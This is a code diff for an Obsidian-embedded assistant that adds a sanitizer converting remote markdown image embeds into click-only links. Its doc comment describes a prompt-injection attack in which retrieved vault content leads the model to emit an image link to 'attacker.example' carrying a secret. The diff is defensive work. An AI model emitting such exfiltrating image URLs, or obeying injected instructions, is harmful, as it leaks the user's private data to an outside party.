@@ -23,6 +23,27 @@ export interface PipelineResult {
 	citations: string[];
 }
 
+// `![alt](https://...)`, `![alt](http://...)`, or `![alt](//...)` — a remote
+// image embed. Local vault paths, relative paths, and `data:` URIs don't
+// match and are left untouched.
+const REMOTE_IMAGE_MARKDOWN_PATTERN =
+	/!\[([^\]]*)\]\((https?:\/\/[^)\s]+|\/\/[^)\s]+)\)/gi;
+
+/**
+ * Prevents assistant markdown from auto-loading remote images: a
+ * prompt-injected clip in retrieved vault context can make the model emit
+ * `![x](https://attacker.example/?data=<secret>)`, and Obsidian's
+ * `MarkdownRenderer` would silently fetch it (exfiltration) as soon as it's
+ * rendered. Turns remote image embeds into plain click-only links; local and
+ * `data:` images are left as embeds.
+ */
+export function neutralizeRemoteImageMarkdown(markdown: string): string {
+	return markdown.replace(
+		REMOTE_IMAGE_MARKDOWN_PATTERN,
+		(_match, alt: string, url: string) => `[${alt}](${url})`,
+	);
+}
+
 export function buildSystemPrompt(chunks: VaultChunk[]): string {
 	const intro =
 		"You are Flint, an assistant embedded in the user's Obsidian vault. " +
